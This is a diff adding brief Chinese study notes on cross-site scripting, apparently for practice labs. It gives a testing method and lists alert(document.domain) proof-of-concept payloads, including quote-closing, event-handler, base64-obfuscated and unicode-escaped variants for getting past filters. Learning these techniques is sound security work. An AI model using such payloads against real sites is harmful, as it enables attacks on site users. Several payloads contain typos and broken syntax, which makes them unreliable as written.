@@ -1,0 +1,19 @@
+1、侦查(找变量(可控))
+2、敌情分析(1、环境分析 2、弹窗符号是否有过滤如:<、(、""、' 3、弹窗关键词是否有过滤如:<script> 4、是否可以临时修改前端属性)
+3、敌情分析构造POC(js)拼接
+#### 常用攻击代码：
+1、<script>alert(document.domdomainain);</script>
+2、"><script>alert(document.domain);</script>
+3、验证发现:p1变量设置了过滤& < 通过抓包把代码替换成为P2的值         
+4、验证发现:p1变量设置了过滤& < 通过抓包发现有三个变量p1 p2 p3 p1.p2做了字符转义 p3是一个字符串需要先闭合再输入代码"><script>alert(document.domain);</script>
+5、通过抓包发现只有一个变量，并设置了字符长度，使用抓包软件把input闭合输入代码"><script>alert(document.domain);</script>
+
+6、通过抓包发现只有一个变量p1,F12查看源码 设置了"特殊符号转义 编辑页面HTML代码直接赋值给value 饶过页面提交
+执行代码有以下几个:
+1、<script>alert(document.domain;</script>
+2、javascript:alert(document.domain)
+3、onmousemover=alert(document.domain)
+4、οnclick="alert(document.domain)
+5、"><script>alert(document.domain);</script>                                                        
+6、"><script> eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>
+7、\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
